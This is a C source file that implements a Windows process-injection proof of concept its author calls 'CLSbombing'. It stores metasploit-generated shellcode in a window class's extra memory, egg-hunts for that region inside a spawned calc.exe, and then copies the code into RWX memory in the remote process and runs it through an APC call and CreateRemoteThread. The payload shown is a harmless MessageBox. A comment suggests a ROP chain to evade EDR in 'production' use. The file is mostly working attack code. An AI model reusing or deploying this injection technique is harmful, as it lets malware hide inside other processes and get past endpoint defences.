#include <windows.h>
#include <stdio.h>
int done = 0;
typedef long WINAPI(*d_NtQueueAPCThread)(HANDLE a, PVOID b, PVOID c, PVOID d, unsigned long long e);
d_NtQueueAPCThread QueueAPCThread = NULL;

LRESULT CALLBACK AnsiWndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam){
    if(!done){
        //generic MessageBox shellcode generated with metasploit
        unsigned char shellcode[] = 
            "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
            "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
            "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
            "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
            "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
            "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
            "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
            "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
            "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
            "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
            "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
            "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
            "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
            "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
            "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
            "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
            "\x8d\x8d\x30\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
            "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
            "\x00\x3e\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba"
            "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
            "\x56\xff\xd5\x48\x65\x6c\x6c\x6f\x20\x66\x72\x6f\x6d\x20"
            "\x43\x4c\x53\x62\x6f\x6d\x62\x69\x6e\x67\x21\x00\x4d\x65"
            "\x73\x73\x61\x67\x65\x42\x6f\x78\x00\x75\x73\x65\x72\x33"
            "\x32\x2e\x64\x6c\x6c\x00";
        done = 1;
        long long asdf = 0;
        unsigned char cook[8] = "eggs123"; //egg for hunting
        memcpy(&asdf, cook, 8);
        SetClassLongPtrA(hwnd, 0, asdf);
        printf("Injected tagCLS, finding offset...\n");
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);

        //hunt egg in own process
        MEMORY_BASIC_INFORMATION mbi;
        LPVOID address = sysinfo.lpMinimumApplicationAddress;
        int off = 0;
        size_t sz = 0;
        while (address < sysinfo.lpMaximumApplicationAddress) {
            if (VirtualQuery(address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
                if (mbi.Type == MEM_MAPPED && mbi.Protect == PAGE_READONLY){
                    for(int i = 0;i < mbi.RegionSize; i++){
                        if(memcmp((BYTE*)mbi.BaseAddress + i, cook, 8) == 0){
                            sz = mbi.RegionSize;
                            off = i;
                            goto fin;
                        }
                    }
                }
            }
            address = (BYTE*)address + mbi.RegionSize;
        }
    fin:
        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        
        printf("Spawning process...\n");
        CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        Sleep(1000);
        address = sysinfo.lpMinimumApplicationAddress;
        int n = 0;
        unsigned long long sled;
        //we only need to find a memory region of similar properties. very few are MEM_MAPPED and PAGE_READONLY, basically only one (tagCLS) has the same size
        //since ASLR does not scramble offsets from beginning of the tagCLS page, our job is very easy
        while (address < sysinfo.lpMaximumApplicationAddress){
            if (VirtualQueryEx(pi.hProcess, address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
                if (mbi.Type == MEM_MAPPED && mbi.Protect == PAGE_READONLY && mbi.RegionSize == sz){
                    printf("FOUND OFFSET: %p\n", (BYTE*)mbi.BaseAddress + off);
                    sled = (unsigned long long)((BYTE*)mbi.BaseAddress + off + 8); //sidestep the egg
                }
            }
            address = (BYTE*)address + mbi.RegionSize;
        }
        printf("Injecting shellcode to tagCLS structure...\n");
        for(int i=1;i<(sizeof(shellcode)/8 + 2); i++){
            memcpy(&asdf, shellcode+((i-1)*8), 8);
            SetClassLongPtrA(hwnd, i*8, asdf);
        }
        printf("Creating threads...\n");
        
        //note: this block is INCREDIBLY noisy to any edr. if you actually wish to use this technique in production, i recommend switching to a rop chain
        //i did not use a rop chain because windows dlls have a pretty bad lack of rop gadgets
        PVOID valloc = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        HANDLE sleeper = CreateRemoteThread(pi.hProcess, NULL, 0, (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "SleepEx"), (LPVOID)100000, 0, NULL);
        QueueAPCThread(sleeper, (PVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlMoveMemory"), valloc, (PVOID)sled, sizeof(shellcode));
        CreateRemoteThread(pi.hProcess, NULL, 0, valloc, NULL, 0, NULL);
        done = 2;
    }
    return 0;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    printf("Beginning CLSbombing...\n");
    QueueAPCThread = (d_NtQueueAPCThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
    WNDCLASSA AnsiWndCls;

    AnsiWndCls.style         = CS_DBLCLKS | CS_PARENTDC;
    AnsiWndCls.lpfnWndProc   = (WNDPROC)AnsiWndProc;
    AnsiWndCls.cbClsExtra    = 0x16010;
    AnsiWndCls.cbWndExtra    = 0;
    AnsiWndCls.hInstance     = hInstance;
    AnsiWndCls.hIcon         = NULL;
    AnsiWndCls.hCursor       = LoadCursor(NULL, (LPTSTR)IDC_IBEAM);
    AnsiWndCls.hbrBackground = NULL;
    AnsiWndCls.lpszMenuName  = NULL;
    AnsiWndCls.lpszClassName = "TestAnsi";
    RegisterClassA(&AnsiWndCls);
    HWND hwnd = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        "TestAnsi",
        "Window",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
        NULL, NULL, hInstance, NULL);
    UpdateWindow(hwnd);
    while(done != 2) Sleep(10);
    DestroyWindow(hwnd);
    printf("CLSbombing complete!\n");
}
